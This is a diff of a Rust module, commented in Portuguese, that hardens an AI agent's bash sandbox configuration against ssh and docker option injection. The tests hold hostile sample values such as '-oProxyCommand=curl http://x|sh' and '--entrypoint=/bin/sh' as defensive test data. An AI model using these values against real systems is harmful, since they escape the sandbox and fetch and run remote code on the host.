@@ -1212,72 +1212,6 @@ pub fn build_agent_runtime(config: &AppConfig) -> AgentRuntime {
 /// Precisa de runtime tokio (spawn dos event loops) — gateway e CLI chamam
 /// de dentro de `run()` async. Sem secao `hardware.*`, retorna antes de
 /// tocar tokio, seguro para testes.
-/// Traduz a secao `agent.sandbox` (#1225) para a `SandboxPolicy` que o
-/// `BashTool` consulta a cada comando.
-///
-/// Mora aqui, e nao numa das duas crates de origem, porque
-/// `garraia-config` e `garraia-agents` nao se conhecem — nenhuma das duas
-/// depende da outra, e criar essa aresta so para uma conversao seria pior do
-/// que centraliza-la no unico lugar que ja ve as duas. Gateway e CLI chamam
-/// esta mesma funcao (`garraia_gateway::bootstrap::sandbox_policy_from`),
-/// pelo mesmo motivo que chamam `spawn_hardware_adapters`: fonte unica do
-/// wiring, sem copias que divergem.
-///
-/// Fail-closed nas duas bordas que podem dar errado:
-///
-/// - `backend = ssh` sem `ssh_host` **nao** vira backend nenhum. A policy
-///   fica com `backend: None`, e `wrap_command` recusa cada comando em vez
-///   de escolher um backend por conta propria ou cair para o host. O
-///   `garra config check` reporta isso como Error antes do boot; aqui sobra
-///   um `warn!` para quem subiu assim mesmo.
-/// - `image` vazia ou so espacos e tratada como ausente, caindo no default
-///   da propria `SandboxPolicy` — nunca vira `-v ... '' sh -lc ...`.
-///
-/// Com a secao ausente (`mode = off`, o default), devolve exatamente
-/// `SandboxPolicy::default()`: zero mudanca de comportamento.
-pub fn sandbox_policy_from(cfg: &garraia_config::SandboxConfig) -> SandboxPolicy {
-    use garraia_config::{SandboxBackendKind, SandboxMode as CfgMode};
-
-    let mode = match cfg.mode {
-        CfgMode::Off => SandboxMode::Off,
-        CfgMode::All => SandboxMode::All,
-        CfgMode::Allowlist => SandboxMode::Allowlist,
-    };
-
-    let backend = match cfg.backend {
-        None => None,
-        Some(SandboxBackendKind::Docker) => Some(SandboxBackend::Docker),
-        Some(SandboxBackendKind::Podman) => Some(SandboxBackend::Podman),
-        Some(SandboxBackendKind::Ssh) => match cfg.ssh_host.as_deref().map(str::trim) {
-            Some(host) if !host.is_empty() => Some(SandboxBackend::Ssh(host.to_string())),
-            _ => {
-                if mode != SandboxMode::Off {
-                    warn!(
-                        "agent.sandbox.backend=ssh sem agent.sandbox.ssh_host: nenhum backend \
-                         sera construido e todo comando sandboxado falha fechado (veja \
-                         `garra config check`)"
-                    );
-                }
-                None
-            }
-        },
-    };
-
-    let padrao = SandboxPolicy::default();
-    SandboxPolicy {
-        mode,
-        sandboxed_tools: cfg.sandboxed_tools.clone(),
-        backend,
-        image: match cfg.image.as_deref().map(str::trim) {
-            Some(img) if !img.is_empty() => img.to_string(),
-            _ => padrao.image,
-        },
-        elevated: cfg.elevated.clone(),
-        mount_workdir: cfg.mount_workdir,
-        network_disabled: cfg.network_disabled,
-    }
-}
-
 pub fn spawn_hardware_adapters(
     config: &AppConfig,
     registry: Arc<DeviceRegistry>,
@@ -1333,6 +1267,120 @@ pub fn spawn_hardware_adapters(
     sobe_automacoes(config, bus, registry);
 
     algum_no_ar.then_some(state)
+}
+
+/// Traduz a secao `agent.sandbox` (#1225) para a `SandboxPolicy` que o
+/// `BashTool` consulta a cada comando.
+///
+/// Mora aqui, e nao numa das duas crates de origem, porque
+/// `garraia-config` e `garraia-agents` nao se conhecem — nenhuma das duas
+/// depende da outra, e criar essa aresta so para uma conversao seria pior do
+/// que centraliza-la no unico lugar que ja ve as duas. Gateway e CLI chamam
+/// esta mesma funcao (`garraia_gateway::bootstrap::sandbox_policy_from`),
+/// pelo mesmo motivo que chamam `spawn_hardware_adapters`: fonte unica do
+/// wiring, sem copias que divergem.
+///
+/// Fail-closed nas duas bordas que podem dar errado:
+///
+/// - `backend = ssh` sem `ssh_host` **nao** vira backend nenhum. A policy
+///   fica com `backend: None`, e `wrap_command` recusa cada comando em vez
+///   de escolher um backend por conta propria ou cair para o host. O
+///   `garra config check` reporta isso como Error antes do boot; aqui sobra
+///   um `warn!` para quem subiu assim mesmo.
+/// - `image` vazia ou so espacos e tratada como ausente, caindo no default
+///   da propria `SandboxPolicy` — nunca vira `-v ... '' sh -lc ...`.
+/// - `ssh_host` ou `image` **comecando com `-`** sao recusados. `sh_quote`
+///   garante um token unico, o que impede injecao de comando; nao impede
+///   injecao de OPCAO. O host fica ANTES do `--` em `ssh {host} -- sh -lc`,
+///   entao `-oProxyCommand=...` e lido como flag e executa no host LOCAL,
+///   pulando o `safety_gate` — o inverso exato do proposito do sandbox. O
+///   mesmo vale para `image`, posicional do `docker run`. Nenhum host e
+///   nenhuma imagem de verdade comeca com `-`, entao recusar e barato.
+///   Segunda camada: o `config check` recusa antes do boot; terceira: o
+///   proprio `wrap_command`. O conserto estrutural (montar argv em vez de
+///   linha de shell) e acompanhamento na #1225 (slices S2/S3), como ja
+///   recomendado na #1231.
+/// - Nomes em `sandboxed_tools`/`elevated` sao trimados. A comparacao na
+///   policy e exata, entao `" bash"` no YAML seria um no-op silencioso.
+///   Maiusculas NAO sao normalizadas: o registry de tools e case-sensitive.
+///
+/// Com a secao ausente (`mode = off`, o default), devolve exatamente
+/// `SandboxPolicy::default()`: zero mudanca de comportamento.
+pub fn sandbox_policy_from(cfg: &garraia_config::SandboxConfig) -> SandboxPolicy {
+    use garraia_config::sandbox::parece_opcao;
+    use garraia_config::{SandboxBackendKind, SandboxMode as CfgMode};
+
+    let mode = match cfg.mode {
+        CfgMode::Off => SandboxMode::Off,
+        CfgMode::All => SandboxMode::All,
+        CfgMode::Allowlist => SandboxMode::Allowlist,
+    };
+
+    let backend = match cfg.backend {
+        None => None,
+        Some(SandboxBackendKind::Docker) => Some(SandboxBackend::Docker),
+        Some(SandboxBackendKind::Podman) => Some(SandboxBackend::Podman),
+        Some(SandboxBackendKind::Ssh) => match cfg.ssh_host.as_deref().map(str::trim) {
+            Some(host) if !host.is_empty() && !parece_opcao(host) => {
+                Some(SandboxBackend::Ssh(host.to_string()))
+            }
+            outro => {
+                if mode != SandboxMode::Off {
+                    // O valor NUNCA entra no log: um `-oProxyCommand=...`
+                    // carrega o comando do atacante, e o log e lido por
+                    // humano e por ferramenta.
+                    warn!(
+                        recusado_por = if outro.is_some_and(parece_opcao) {
+                            "comeca com `-` (seria lido como opcao do ssh, nao como host)"
+                        } else {
+                            "ausente ou vazio"
+                        },
+                        "agent.sandbox.backend=ssh sem ssh_host utilizavel: nenhum backend sera \
+                         construido e todo comando sandboxado falha fechado (veja \
+                         `garra config check`)"
+                    );
+                }
+                None
+            }
+        },
+    };
+
+    let padrao = SandboxPolicy::default();
+    SandboxPolicy {
+        mode,
+        sandboxed_tools: nomes_de_tool(&cfg.sandboxed_tools),
+        backend,
+        image: match cfg.image.as_deref().map(str::trim) {
+            Some(img) if !img.is_empty() && !parece_opcao(img) => img.to_string(),
+            Some(img) if parece_opcao(img) => {
+                warn!(
+                    "agent.sandbox.image comeca com `-` e seria lida como opcao do docker/podman \
+                     em vez de nome de imagem; usando a imagem padrao (veja `garra config check`)"
+                );
+                padrao.image
+            }
+            _ => padrao.image,
+        },
+        elevated: nomes_de_tool(&cfg.elevated),
+        mount_workdir: cfg.mount_workdir,
+        network_disabled: cfg.network_disabled,
+    }
+}
+
+/// Nomes de tool trimados, sem entradas vazias.
+///
+/// A `SandboxPolicy` compara nome por igualdade exata, entao `" bash"` vindo
+/// de uma lista YAML seria um item que existe no arquivo e nao existe para o
+/// codigo. Caixa nao e normalizada de proposito — o registry de tools e
+/// case-sensitive, e "consertar" `Bash` aqui esconderia o erro do operador
+/// em vez de o `config check` o apontar.
+fn nomes_de_tool(entradas: &[String]) -> Vec<String> {
+    entradas
+        .iter()
+        .map(|t| t.trim())
+        .filter(|t| !t.is_empty())
+        .map(str::to_string)
+        .collect()
 }
 
 /// Sobe o adapter MQTT (#1126) quando `hardware.mqtt` esta configurado.
@@ -2227,6 +2275,79 @@ mod tests {
         let p = sandbox_policy_from(&config.agent.sandbox);
         assert_eq!(p.image, SandboxPolicy::default().image);
         assert!(!p.image.trim().is_empty());
+    }
+
+    /// #1225 F1: `ssh_host` que comeca com `-` nao vira backend. O `ssh` le
+    /// o token como flag (o host fica ANTES do `--`), e `-oProxyCommand=…`
+    /// executaria no host LOCAL, pulando o `safety_gate`. Recusar e a
+    /// resposta certa: nenhum host de verdade comeca com `-`.
+    #[test]
+    fn sandbox_ssh_host_que_parece_opcao_nao_vira_backend() {
+        for hostil in [
+            "-oProxyCommand=curl http://x|sh",
+            "--rsh=sh",
+            "  -oProxyCommand=x",
+        ] {
+            let mut config = AppConfig::default();
+            config.agent.sandbox.mode = garraia_config::SandboxMode::All;
+            config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Ssh);
+            config.agent.sandbox.ssh_host = Some(hostil.into());
+            let p = sandbox_policy_from(&config.agent.sandbox);
+            assert_eq!(p.backend, None, "host hostil aceito: {hostil:?}");
+            let err = p
+                .wrap_command("bash", "echo nunca", "/tmp")
+                .expect_err("sem backend o comando e recusado");
+            assert!(err.to_string().contains("nenhum backend"), "err = {err}");
+        }
+    }
+
+    /// Mesma classe no `image`, que e posicional do `docker run`: cai no
+    /// default em vez de virar opcao.
+    #[test]
+    fn sandbox_image_que_parece_opcao_cai_no_default() {
+        let mut config = AppConfig::default();
+        config.agent.sandbox.mode = garraia_config::SandboxMode::All;
+        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Docker);
+        config.agent.sandbox.image = Some("--entrypoint=/bin/sh".into());
+        let p = sandbox_policy_from(&config.agent.sandbox);
+        assert_eq!(p.image, SandboxPolicy::default().image);
+    }
+
+    /// Um host legitimo com hifen no MEIO continua passando — o guard e
+    /// sobre a primeira posicao, nao sobre o caractere.
+    #[test]
+    fn sandbox_host_com_hifen_no_meio_continua_valido() {
+        let mut config = AppConfig::default();
+        config.agent.sandbox.mode = garraia_config::SandboxMode::All;
+        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Ssh);
+        config.agent.sandbox.ssh_host = Some("build-box-01.interno".into());
+        let p = sandbox_policy_from(&config.agent.sandbox);
+        assert_eq!(
+            p.backend,
+            Some(SandboxBackend::Ssh("build-box-01.interno".into()))
+        );
+    }
+
+    /// #1225 F4: a policy compara nome por igualdade exata, entao um espaco
+    /// vindo da lista YAML seria um item que existe no arquivo e nao existe
+    /// para o codigo. Caixa NAO e normalizada: o registry e case-sensitive e
+    /// "consertar" `Bash` aqui esconderia o erro do operador.
+    #[test]
+    fn sandbox_nomes_de_tool_sao_trimados_mas_nao_normalizados() {
+        let mut config = AppConfig::default();
+        config.agent.sandbox.mode = garraia_config::SandboxMode::Allowlist;
+        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Docker);
+        config.agent.sandbox.sandboxed_tools =
+            vec![" bash ".into(), "".into(), "   ".into(), "Bash".into()];
+        config.agent.sandbox.elevated = vec!["\tweb_fetch\n".into()];
+        let p = sandbox_policy_from(&config.agent.sandbox);
+        assert_eq!(
+            p.sandboxed_tools,
+            vec!["bash".to_string(), "Bash".to_string()],
+            "entradas vazias somem, o resto e so trimado"
+        );
+        assert_eq!(p.elevated, vec!["web_fetch".to_string()]);
+        assert!(p.requires_sandbox("bash"), "` bash ` passou a casar");
     }
 
     #[test]
